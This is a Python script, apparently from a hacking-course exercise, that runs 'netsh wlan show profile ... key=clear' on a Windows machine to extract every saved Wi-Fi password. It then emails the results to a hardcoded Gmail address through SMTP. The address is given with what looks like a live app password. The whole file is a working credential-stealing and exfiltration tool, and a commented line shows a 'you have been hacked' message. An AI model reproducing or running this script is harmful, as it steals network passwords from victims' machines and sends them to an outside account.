#!/usr/bin/env python3

"""
Windows commands:
netsh wlan show profile # To show all the wlan conections that have ben used by the machine
netsh wlan show profile <wifi_name>  # To get the information from a particular network
netsh wlan show profile <wifi_name> key=clear # It shows also the wifi password of the network
"""

import subprocess
import smtplib
import re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", port=587) # We create an instance for an SMTP server and we'll use goolge's SMTP server, that works on pot 587
    server.starttls() # Then we start a TLS connection using the server that we've just created
    server.login(email, password) # Now we must log in to our email
    server.sendmail(email, email, message) # The arguments to send the email are: 1set From, 2nd To and 3rd Content of the email
    server.quit() # Finally we close the server

# command = "msg * you have been hacked"
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True) # Executes a command and returns its result
network_names_list = re.findall("(?:usuarios\s*:\s)(.*)", networks) # "Profile" in stead of "usuarios" if the system is configured in english

result = ""
for network_name in network_names_list:
    # printp(network_name
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result
# subprocess.Poppen(command, shell=True) # executes the command that you give and continues with the program
send_mail("mituconservata@gmail.com", "oryswcbzcubeplkd", result)
